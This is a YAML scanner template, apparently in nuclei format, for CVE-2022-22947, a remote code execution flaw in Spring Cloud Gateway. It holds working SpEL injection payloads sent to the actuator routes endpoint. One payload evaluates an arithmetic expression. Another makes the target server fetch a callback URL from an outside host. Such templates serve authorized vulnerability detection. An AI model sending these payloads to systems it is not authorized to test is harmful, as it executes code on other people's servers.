id: yaml-poc-vmware-spring_cloud_gateway-rce-CVE-2022-22947
info:
  name: Yaml Poc Vmware Spring_Cloud_Gateway Rce Cve 2022 22947
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-vmware-spring_cloud_gateway-rce-CVE-2022-22947'
  tags: spring,vmware,rce,cve
  classification:
    cve-id: CVE-2022-22947
  reference:
  - http://packetstormsecurity.com/files/166219/Spring-Cloud-Gateway-3.1.0-Remote-Code-Execution.html
  - http://packetstormsecurity.com/files/168742/Spring-Cloud-Gateway-3.1.0-Remote-Code-Execution.html
  - https://cxsecurity.com/cveshow/CVE-2022-22947/
  - https://cxsecurity.com/issue/WLB-2022030035
  - https://packetstormsecurity.com/files/166219/Spring-Cloud-Gateway-3.1.0-Remote-Code-Execution.html
http:
- method: POST
  path:
  - /actuator/gateway/routes/{{randPath}}
  body: '{ "predicates": [ { "name": "Path", "args": { "_genkey_0": "/{{routeName}}/**"
    } } ], "filters": [ { "name": "RewritePath", "args": { "_genkey_0": "#{T(java.lang.Math).multiplyExact({{randInt0}},{{randInt1}})}",
    "_genkey_1": "/${path}" } } ], "uri": "https://{{randStr0}}.com", "order": 0 }

    '
  headers:
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 201
- method: POST
  path:
  - /actuator/gateway/refresh
  headers:
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /actuator/gateway/routes/{{randPath}}
  body: '{ "predicates": [ { "name": "Path", "args": { "_genkey_0": "/{{routeName}}/**"
    } } ], "filters": [ { "name": "RewritePath", "args": { "_genkey_0": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(new
    java.net.URL(\"{{reverseURL}}\").openStream()))}", "_genkey_1": "/${path}" } }
    ], "uri": "https://{{randStr0}}.com", "order": 0 }

    '
  headers:
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 201
